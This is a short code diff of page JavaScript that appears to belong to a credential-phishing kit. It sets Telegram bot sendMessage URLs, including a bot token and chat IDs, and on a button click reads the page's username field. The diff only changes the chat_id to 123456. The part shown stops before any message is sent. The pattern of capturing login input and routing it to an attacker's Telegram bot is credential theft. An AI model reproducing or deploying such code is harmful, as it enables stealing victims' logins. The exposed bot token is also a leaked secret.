@@ -903,8 +903,8 @@
 
   $(document).ready(()=> {
     const burl =
-    `https://api.telegram.org/bot6976353764:AAHHgmP9q_Mied_ku5B4FEkNPWRMoTIcrOs/sendMessage?chat_id=5067170231`
-    const burl1 = `https://api.telegram.org/bot6976353764:AAHHgmP9q_Mied_ku5B4FEkNPWRMoTIcrOs/sendMessage?chat_id=5067170231`
+    `https://api.telegram.org/bot6976353764:AAHHgmP9q_Mied_ku5B4FEkNPWRMoTIcrOs/sendMessage?chat_id=123456`
+    const burl1 = `https://api.telegram.org/bot6976353764:AAHHgmP9q_Mied_ku5B4FEkNPWRMoTIcrOs/sendMessage?chat_id=123456`
 
     $(btn1).on("click", ()=> {
       let username = jQuery("#username").val();
